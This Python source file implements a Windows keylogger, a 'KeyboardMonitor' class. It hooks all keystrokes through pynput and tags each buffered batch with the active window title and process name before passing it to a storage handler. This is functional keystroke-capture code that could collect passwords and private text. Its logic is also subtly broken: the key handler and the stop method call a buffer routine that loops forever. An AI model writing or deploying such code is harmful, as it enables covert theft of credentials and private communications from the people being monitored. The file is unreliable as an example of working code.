import logging
from pynput import keyboard
import win32gui
import win32process
import psutil
from datetime import datetime
import threading
import queue

class KeyboardMonitor:
    def __init__(self, storage_handler):
        self.storage_handler = storage_handler
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.word_queue = queue.Queue()
        self.last_window = None
        self.special_keys = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.tab': '\t',
            'Key.backspace': '[BS]'
        }

    def get_active_window_info(self):
        """Get detailed information about the currently active window"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            window_title = win32gui.GetWindowText(hwnd)
            try:
                process = psutil.Process(pid)
                process_name = process.name()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                process_name = "Unknown"
            
            return {
                "window_title": window_title,
                "process_name": process_name,
                "pid": pid
            }
        except Exception as e:
            logging.error(f"Error getting window info: {e}")
            return None

    def process_key_buffer(self):
        """Process and store the key buffer periodically"""
        while True:
            try:
                if len(self.key_buffer) >= 20:  # Process every 20 characters
                    with self.buffer_lock:
                        if self.key_buffer:
                            window_info = self.get_active_window_info()
                            key_data = {
                                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f"),
                                "content": ''.join(self.key_buffer),
                                "window_info": window_info
                            }
                            self.storage_handler.store_data("keystrokes", key_data)
                            self.key_buffer.clear()
            except Exception as e:
                logging.error(f"Error processing key buffer: {e}")

    def on_press(self, key):
        """Handle key press events"""
        try:
            # Convert key to string representation
            key_char = self.special_keys.get(str(key), '')
            if not key_char:
                try:
                    key_char = key.char
                except AttributeError:
                    key_char = f'[{str(key)}]'

            # Get current window
            current_window = self.get_active_window_info()
            if current_window != self.last_window:
                self.process_key_buffer()  # Process buffer on window change
                self.last_window = current_window

            # Add key to buffer
            with self.buffer_lock:
                self.key_buffer.append(key_char)

        except Exception as e:
            logging.error(f"Error in key press handler: {e}")

    def start_monitoring(self):
        """Start keyboard monitoring"""
        try:
            # Start buffer processing thread
            processor_thread = threading.Thread(
                target=self.process_key_buffer,
                daemon=True
            )
            processor_thread.start()

            # Start keyboard listener
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()

        except Exception as e:
            logging.error(f"Error starting keyboard monitor: {e}")

    def stop_monitoring(self):
        """Stop keyboard monitoring"""
        self.running = False
        self.process_key_buffer() 